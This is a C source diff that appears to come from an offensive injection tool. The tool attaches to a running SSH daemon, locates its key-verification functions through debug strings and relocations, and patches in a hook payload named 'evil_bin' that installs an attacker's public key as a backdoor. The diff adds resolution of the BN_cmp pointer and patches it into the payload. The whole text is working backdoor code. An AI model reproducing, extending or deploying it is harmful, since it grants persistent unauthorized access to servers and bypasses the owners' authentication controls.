@@ -4,6 +4,7 @@
 #include <unistd.h>
 #include <sys/mman.h>
 
+#include <elflib.h>
 #include <inject.h>
 #include <sig.h>
 #include <common.h>
@@ -19,7 +20,7 @@ void backdoor_pubkey_install(inject_ctx *ctx, char *pubkey) {
 		{ 0x7777777788888888, "key_allowed", "trying public key file %s", 0 },
 		{ 0xaaaaaaaabbbbbbbb, "key_new"    , "key_new: RSA_new failed"  , 0 },
 		{ 0x1111111122222222, "key_read"   , "key_read: type mismatch: ", 0 },
-		{ 0x3333333344444444, "key_equal"  , "key_equal: bad"           , 0 },
+//		{ 0x3333333344444444, "key_equal"  , "key_equal: bad"           , 0 },
 		{ 0x5555555566666666, "key_free"   , "key_free: "               , 0 },
 		{ 0x99999999aaaaaaaa, "restore_uid", "restore_uid: %u/%u"       , 0 },
 	};
@@ -36,14 +37,19 @@ void backdoor_pubkey_install(inject_ctx *ctx, char *pubkey) {
 	memcpy(evil_bin, hook_pubkey_bin, hook_pubkey_bin_len);
 
 	for(i = 0; i < sizeof(signatures) / sizeof(signature); i++) {
-		signatures[i].addr = sub_by_debugstr(ctx, signatures[i].str);
+		if (strcmp(signatures[i].name, "1key_equal") == 0) {
+			ctx->debug = 1;
+			signatures[i].addr = jmp_by_debugstr(ctx, signatures[i].str);
+		} else
+			signatures[i].addr = sub_by_debugstr(ctx, signatures[i].str);
+
 		if (signatures[i].addr == 0) {
 			error("%s not found :(\n", signatures[i].name);
 		}
 
 		sprintf(line, 
 			"%s\t\t= \x1b[37m0x%lx",
-			signatures[i].name, signatures[i].addr
+			signatures[i].name, signatures[i].addr - ctx->elf_base
 		);
 
 		for(j = 0; j < hook_pubkey_bin_len - 8; j++) {
@@ -62,12 +68,28 @@ void backdoor_pubkey_install(inject_ctx *ctx, char *pubkey) {
 		info(line);
 	}
 
+	u64 f_BN_cmp = resolve_reloc(ctx->rela, ctx->rela_sz, ctx->dynsym, ctx->dynsym_sz, ctx->dynstr, "BN_cmp");
+	info("BN_cmp@got = 0x%lx", f_BN_cmp);
+	u64 l_BN_cmp;
+	_peek(ctx->pid, ctx->elf_base + f_BN_cmp, &l_BN_cmp, 8);
+	info("BN_cmp@lib = 0x%lx", l_BN_cmp);
+
+	for(j = 0; j < hook_pubkey_bin_len - 8; j++) {
+		u64 *vptr = (u64*)&evil_bin[j];
+		if (*vptr == 0xbadc0dedbeefbabe) {
+			info("found BN_cmp ptr @ %lx", j);
+
+			*vptr = l_BN_cmp;
+			break;
+		}
+	}
+
 	callcache = get_callcache();
 	callcache_total = get_callcachetotal();
 
 	for(i=0; i<callcache_total; i++) {
 		entry = &callcache[i];
-		if (entry->dest == signatures[0].addr) {
+		if (entry->dest == signatures[0].addr && entry->type == CALLCACHE_TYPE_CALL) {
 			info("found a 'call user_key_allowed' @ 0x%lx", entry->addr);
 			user_key_allowed2_calls[num_key_allowed2_calls] = entry->addr;
 			num_key_allowed2_calls++;
